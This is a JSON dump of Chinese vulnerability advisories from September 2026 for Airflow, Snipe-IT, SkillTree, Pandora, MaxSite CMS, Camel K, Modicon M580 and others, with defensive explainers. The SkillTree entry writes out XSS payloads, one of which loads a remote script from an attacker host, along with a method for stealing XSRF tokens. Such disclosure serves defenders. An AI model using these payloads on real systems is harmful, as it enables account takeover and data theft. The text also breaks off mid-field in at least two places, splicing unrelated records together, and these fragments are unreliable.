fj", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-4r15-w7fj", "name": "https://www.oscs1024.com/hd/MPS-4r15-w7fj"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69730", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-69730"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69730", "name": "Windows DNS Server Remote Code Execution Vulnerability"}], "scope_influence": "广", "tags": ["专家校准", "操作系统"], "title": "Windows DNS Server远程代码执行漏洞", "_translated": true, "_saved_at": "2026-09-09T10:35:48+00:00", "_first_saved_at": "2026-09-09T10:35:48+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-4r15-w7fj"}, {"analysis_status": 0, "articles": [{"content": "应用程序在进行身份验证时使用了不恰当的机制或实施不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-75156", "cvss": {}, "cvss_score": 9.8, "cvss_vector": "", "cwe": "CWE-287", "description": "Apache Airflow FAB provider（apache-airflow-providers-fab）是开源工作流平台 Apache Airflow 的 Flask App Builder 认证管理组件，用于提供 Web UI 登录、角色权限控制以及 Azure AD 等 OAuth 单点登录。\n受影响版本中，FAB 认证管理器在 Azure AD OAuth 登录路径上由 get_oauth_user_info 读取 resp 中的 id_token，再交由 _decode_and_validate_azure_jwt 处理。该方法使用 Microsoft 多租户 JWKS 校验签名，但调用 authlib_jwt.decode 时未传入 claims_options，claims.validate() 不检查 issuer 与 audience。攻击者可在自建 Azure 租户中签发通过签名校验的 id_token，使系统按令牌内 oid、email、roles 完成登录与角色分配，从而在无该部署既有访问权限的情况下进入 Airflow UI。\n修复版本中通过在 _decode_and_validate_azure_jwt 中解析部署所配置的 Azure 租户，并向 decode 传入 claims_options，要求 iss 属于该租户、aud 等于应用 client_id；当配置无法确定单一租户时拒绝接受令牌，切断跨租户令牌进入身份与角色映射的路径。", "effects": [{"comp_name": "apache-airflow-providers-fab", "ecosystem": "pip", "versions": [{"affected_version": "[3.7.3,3.8.1)", "min_fixed_version": "3.8.1", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "可选修复", "kind": "身份验证不当", "kind_en": "认证不当", "last_modified_time": "2026-09-09", "level": "Critical", "mps_id": "MPS-ae73-84ff", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.openwall.com/lists/oss-security/2026/09/08/13", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-75156", "name": ""}, {"url": "https://github.com/apache/airflow/pull/71735", "name": ""}, {"url": "https://github.com/apache/airflow/commit/75ecbdd36d89db8ae41b891bc0d41acf9b655723", "name": ""}, {"url": "https://github.com/apache/airflow/blob/providers-fab/3.8.1/providers/fab/docs/changelog.rst", "name": ""}, {"url": "https://pypi.org/project/apache-airflow-providers-fab/3.8.1/", "name": ""}, {"url": "https://airflow.apache.org/", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-59243", "name": ""}], "scope_influence": "", "tags": ["python", "开源", "终端软件"], "title": "Airflow FAB认证绕过", "_translated": true, "_saved_at": "2026-09-08T16:59:16+00:00", "_first_saved_at": "2026-09-08T16:59:16+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ae73-84ff"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-86738", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N", "severity": "high", "base_score": 8.7}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.3}]}, "cvss_score": 9.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-79", "description": "Snipe-IT 是开源 IT 资产管理系统，基于 Laravel 构建，用于资产盘点、库存与设备全生命周期管理。\n受影响版本中，超级管理员通过 SettingsController::postBranding 写入的 custom_css 会在 Setting::show_custom_css() 中先经 e() HTML 编码，再把 \u0026gt; 与 \u0026quot; 解码回 \u003e 和 \"，使 @import 与外部 url() 原样进入全局 style。其他超级管理员加载任意页面时，攻击者可用 input[name=\"_token\"] 属性选择器逐字符带出 CSRF token，进而伪造状态变更请求接管账户。\n修复版本中通过重写 show_custom_css()，改为 strip_tags()、剥离 @import 规则并拒绝外部及 data/javascript/vbscript 协议的 url() 引用，切断恶意样式外带与 CSRF token 泄露路径。", "effects": [{"comp_name": "grokability/snipe-it", "ecosystem": "composer", "versions": [{"affected_version": "[3.0,8.7.0)", "min_fixed_version": "8.7.0", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "last_modified_time": "2026-09-08", "level": "Critical", "mps_id": "MPS-87fg-q2kl", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-87fg-q2kl", "name": "https://www.oscs1024.com/hd/MPS-87fg-q2kl"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86738", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86738"}, {"url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-pvcw-mp8q-mj39", "name": "GitHub Security Advisory (GHSA-pvcw-mp8q-mj39)"}, {"url": "https://github.com/grokability/snipe-it/commit/d26d71688359707f3b257fc04fe6c3e5a17405f9", "name": "Patch Commit"}, {"url": "https://www.vulncheck.com/advisories/snipe-it-before-8.7.0-css-injection-via-custom-css", "name": "VulnCheck Advisory: Snipe-IT before 8.7.0 CSS Injection via Custom CSS"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Snipe-IT CSS注入漏洞", "_translated": true, "_saved_at": "2026-09-08T16:59:18+00:00", "_first_sav  "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L", "severity": "critical", "base_score": 9.6}]}, "cvss_score": 9.6, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L", "cwe": "CWE-693", "description": "SkillTree是一个微学习游戏化平台。在 4.4.2 版本之前，两个独立的代码缺陷组合成一个可利用的攻击链，具有三种不同的影响不断升级的利用路径。 `StringHighlighter.js` 通过将原始 `value` 子字符串直接插入到没有 HTML 实体编码的模板文字中来构建 HTML 字符串。 `HighlightedValue.vue` 通过 Vue 的 `v-html` 指令渲染该字符串以及所有未过滤的纯值，该指令设置 `innerHTML`。另外，帐户注册端点接受“firstName”、“lastName”和“nickname”字段，并在不进行任何 HTML 清理的情况下存储它们。攻击者自行注册“firstName = \"\u003cimg src=x onerror=alert(1)\u003e\"”（28 个字符 - 在 30 个字符的字段限制内）并访问任何测验。下次管理员打开“测验运行”页面时，有效负载将在浏览器中执行。存在三种影响不断升级的攻击路径。第一个是基本的跨站点脚本编写。当管理员通过正常使用导航到运行页面时，任何符合 30 个字符限制的自包含有效负载（例如“\u003cimg src=x onerror=alert(1)\u003e”，即 28 个字符）都会自动触发。只需零个额外步骤即可确认管理员浏览器中的任意代码执行。第二个是通过“import()”远程脚本加载。使用分割字段技术（`lastName = \"\u003cimg src=x\"`、`firstName = \"onerror=import('//nsas.cc/p')\u003e\"`），攻击者从其服务器加载完整的 JavaScript 文件。该文件没有大小限制，可以执行任何管理操作 - 删除所有项目、创建后门帐户、转储用户数据、安装键盘记录器。无需网络钓鱼。唯一的限制是 URL 必须包含 11 个字符 (`//nsas.cc/p`)。三是完全跨站请求伪造令牌盗窃。使用“eval(name)”，攻击者首先向管理员发送一个重定向链接，将“window.name”预设为数据盗窃有效负载。会话cookie是`HttpOnly`，不能通过`document.cookie`读取；然而，XSRF 令牌是可读的，攻击者利用同源执行从受害者浏览器内部调用管理 API，将响应转发到外部服务器。除了日常使用之外，不需要任何管理交互。 4.4.2 版包含补丁。", "effects": [{"comp_name": "skills-service", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,4.4.2)", "min_fixed_version": "4.4.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "保护机制失效", "kind_en": "保护机制失效", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-xy34-hwj8", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-xy34-hwj8", "name": "https://www.oscs1024.com/hd/MPS-xy34-hwj8"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54694", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-54694"}, {"url": "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8", "name": "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8"}], "scope_influence": "", "tags": [], "title": "CVE-2026-54694漏洞", "_translated": true, "_saved_at": "2026-09-09T21:27:41+00:00", "_first_saved_at": "2026-09-09T21:27:41+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-xy34-hwj8"}, {"analysis_status": 0, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等。", "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-88069", "cvss": {"cvssv4": [{"source": "5a6e4751-2f3f-4070-9419-94fb35b644e8", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.3}]}, "cvss_score": 9.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-22", "description": "Pandora 是 pandora-analysis 团队开源（AGPL-3.0）的文件恶意软件分析框架，采用 worker 架构对用户提交的文件自动解包、转换并做静态检测，其中 extractor worker 负责将归档与磁盘镜像中的内容解压到任务目录。\n受影响版本中，extractor worker 把 ISO/CAB 等归档内部的文件名与解压目录直接拼接后写盘：_extract_iso 使用磁盘镜像目录记录中的 filename 构造 filepath，_extract_cab 使用 CAB 记录中的 filename 字段构造 file_path，两者写盘前未对最终路径做 resolve 与目录包含校验。拥有文件提交权限的用户上传携带越权路径的 ISO 或 CAB 文件，extractor worker 分析该文件时会把内容写到任务解压目录之外，覆盖 worker 进程可写的应用或系统文件，导致文件被篡改与拒绝服务，并可能借助被覆盖文件获得进一步入侵能力。\n修复版本中通过新增的 __safe_save 统一收口写盘动作：写入前对目标路径执行 resolve，并用 is_relative_to 校验其仍位于指定解压目录之下，越界时抛出新增的 PathTransversal 异常并拒绝写入，analyse 捕获该异常后将任务报告置为 ALERT 并记录路径穿越告警，从而切断越界写入链路。该修复当前位于仓库 develop 分支（commit d86ac5b260fb9a41e07f1da1bbd326cdcfc188a7），截至 2026-09-10 尚未包含在任何正式发布版本中。", "effects": [{"comp_name": "pandora", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.12.7]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-rbf2-htov", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-rbf2-htov", "name": "https://www.oscs1024.com/hd/MPS-rbf2-htov"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88069", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-88069"}, {"url": "https://github.com/pandora-analysis/pandora/commit/d86ac5b260fb9a41e07f1da1bbd326cdcfc188a7", "name": ""}], "scope_influence": "", "tags": ["应用软件", "终端软件"], "title": "Pandora 解压路径穿越漏洞", "_translated": true, "_saved_at": "2026-09-10T02:37:56+00:00", "_first_saved_at": "2026-09-09T23:45:46+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-rbf2-htov"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-87929", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": mon/core/init.php#L70-L96", "name": ""}, {"url": "https://www.vulncheck.com/advisories/maxsite-cms-through-109.6-authentication-bypass-via-hardcoded-encryption-key", "name": "VulnCheck Advisory: MaxSite CMS through 109.6 Authentication Bypass via Hardcoded Encryption Key"}], "scope_influence": "", "tags": ["应用软件"], "title": "MaxSite CMS 通过硬编码加密密钥绕过 109.6 身份验证", "_translated": true, "_saved_at": "2026-09-09T21:27:43+00:00", "_first_saved_at": "2026-09-09T18:22:26+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ymnh-6l0r"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-80351", "cvss": {}, "cvss_score": 9.2, "cvss_vector": "", "cwe": "CWE-95", "description": "Apache Camel K 是 Apache 软件基金会开源的 Kubernetes operator，用于以 Integration 等自定义资源声明式构建、部署和管理 Apache Camel 集成应用，受影响代码以 Go 编写并随 operator 容器镜像分发。\n受影响版本中，租户可通过 Integration/IntegrationKit 的 spec.repositories 字段或 kamel run --maven-repository 参数提交任意 Maven 仓库字符串，builderTrait 的 builderTask 生成构建任务时未做任何白名单校验，直接经 mvn.NewRepository 解析后写入 Maven 配置，pkg/util/maven 的 extraRepositories.apply 将该字符串同时写入 settings 的 repositories 与 pluginRepositories，并支持 @mirrorOf=、@checksumpolicy= 等指令，默认构建策略 routine 使 Maven 在 operator Pod 内执行，租户可控仓库因此影响 operator 内依赖与插件解析，租户最终能以 operator 权限执行任意代码。\n修复版本中通过新增 Maven 仓库白名单切断该链路：platform 包新增 IsMavenRepoAllowed，按 operator 环境变量 MAVEN_REPOSITORIES_ALLOWED（默认仅 Maven Central）对仓库全串精确匹配，builder trait 与 camel trait 在写入 Maven 配置前逐一校验，白名单外仓库直接使构建报错终止，阻止租户可控仓库到达 operator 内的 Maven 执行。", "effects": [{"comp_name": "camel_k", "ecosystem": "linux", "versions": [{"affected_version": "[2.10.0,2.10.2)", "min_fixed_version": "2.10.2", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[2.0.0,2.9.3)", "min_fixed_version": "2.9.3", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "eval注入", "kind_en": "动态评估代码中指令的不当中和（“评估注入”）", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-3bab-2fa2", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "http://www.mail-archive.com/announce@apache.org/msg11867.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80351.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80351.txt.asc", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-80351", "name": ""}, {"url": "https://github.com/apache/camel-k/pull/6786", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/42b4573a779c4202a205a088e42c781cea3e4ed4", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/954ff98054a28e3369712ecc8522811a70afa802", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Apache Camel K 任意代码执行漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:33+00:00", "_first_saved_at": "2026-09-10T07:46:33+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-3bab-2fa2"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-3869", "cvss": {}, "cvss_score": 9.2, "cvss_vector": "", "cwe": "CWE-303", "description": "Modicon M580 是施耐德电气（Schneider Electric）推出的基于以太网的可编程自动化控制器（ePAC），Modicon M580 Safety 为其面向功能安全场景的型号，两者均为闭源商业固件产品，广泛用于制造业与关键基础设施的过程控制。\n受影响版本中，控制器认证算法实现存在缺陷（CWE-303），当 PLC 上运行的应用项目 application level 低于安全阈值（M580 低于 4.00、M580 Safety 低于 4.20）时，攻击者可从网络侧在无需任何凭据与用户交互的情况下与控制器建立未认证连接，进而读取或篡改控制逻辑、中断工业过程，导致 PLC 机密性、完整性与可用性全部受损。\n修复版本中通过固件升级与提升应用项目 application level 双重措施切断该利用链：Modicon M580 需固件 4.10 或以上并使用 EcoStruxure Control Expert V15.2 或更高版本将应用项目更新至 application level 4.00 或以上，Modicon M580 Safety 需固件 4.21 或以上并使用 EcoStruxure Control Expert V16.0 含 HF001 或更高版本更新至 application level 4.20 或以上，以消除未认证连接风险。", "effects": [{"comp_name": "modicon_m580_firmware", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,application level 4.00)", "min_fixed_version": "application level 4.00", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "modicon_m580_safety_firmware", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,application level 4.20)", "min_fixed_version": "application level 4.20", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "认证算法的不正确实现", "kind_en": "Incorrect Implementation of Authentication Algorithm", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-a31c-d978", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.securityweek.com/ics-patch-tuesday-schneider-electric-siemens-fix-critical-flaws/", "name": ""}, {"url": "https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2026-251-04\u0026p_enDocType=Security+and+Safety+Notice\u0026p_File_Name=SEVD-2026-251-04.pdf", "name": ""}, {"url": "https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2026-251-04\u0026p_enDocType=Security+and+Safety+Notice\u0026p_File_Name=sevd-2026-251-04.json", "name": ""}, {"url": "https://www.se.com/ww/en/work/support/cybersecurity/security-notifications/", "name": ""}, {"url": "https://zibersegurtasun.euskadi.eus/albistea/2026/multiples-vulnerabilidades-productos-schneider-electric/cyb-aviso-sci-20260908/webcyb00-contcibglos/eu/", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Modicon M580认证算法缺陷漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:30+00:00", "_first_saved_at": "2026-09-10T07:46:30+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-a31c-d978"}, {"analysis_status": 0, "articles": [{"content": "- 攻击者通过向受信任的数据序列化过程中添加恶意数据，从而在序列化和反序列化过程中执行恶意代码的攻击漏洞。这种漏洞通常存在于使用序列化 (serialization) 机制存储和传输数据的程序中。\n", "title": "什么是反序列化"}, {"content": "- 注入攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码注入到程序中，从而实现代码执行的目的。\n- 反射攻击：攻击者使用反射机制，在序列化过程中动态生成恶意数据，并将恶意代码注入到程序中，从而实现代码执行的目的。\n- 缓冲区溢出攻击：攻击者通过在序列化过程中向缓冲区输入恶意数据，导致缓冲区溢出，从而破坏程序的内存管理，实现代码执行的目的。\n- 格式字符串攻击：攻击者通过在序列化过程中输入恶意数据，导致程序使用错误的格式字符串，从而实现代码执行的目的。\n- 数据流攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码作为一个数据流传递给程序，从而实现代码执行的目的。\n", "title": "反序列化常见的攻击方式"}, {"content": "- 不信任输入数据：程序应该严格检查输入数据的有效性，并避免使用不受信任的数据。\n- 使用安全的序列化机制：程序应该使用安全的序列化机制，如 JSON 或 XML 序列化，而不是第三方序列化库。\n- 最小特权原则：程序应该限制对受信任数据的处理权限，并避免在运行时修改数据。\n- 代码审查和漏洞扫描：程序应该进行代码审查和漏洞扫描，以发现和修复潜在的安全漏洞。\n", "title": "如何预防反序列化"}], "cnvd_id": "", "cve_id": "CVE-2026-87930", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.2}]}, "cvss_score": 9.2, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-502", "description": "MaxSite CMS 通过 109.6 将 ci_session cookie 传递给 unserialize()，而没有类限制，从而允许未经身份验证的攻击者注入 PHP 对象。攻击者可以使用硬编码加密密钥伪造有效的会话 cookie，以触发魔术方法并破坏应用程序状态或在小工具类存在的情况下实现代码执行。", "effects": [{"comp_name": "maxsite_cms", "ecosystem": "linux", "versions": [{"affected_version": "[0.78,109.6]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "反序列化", "kind_en": "不可信数据的反序列化", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-b6ul-ptjk", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk", "name": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-87930", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-87930"}, {"url": "https://github.com/maxsite/cms", "name": ""}, {"url": "https://github.com/EviL0rd/maxsite-cve6/blob/main/2026.09.08-maxsite-cms-unsafe-unserialize-object-injection.md", "name": ""}, {"url": "https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/system/libraries/Session.php#L670-L680", "name": ""}, {"url": 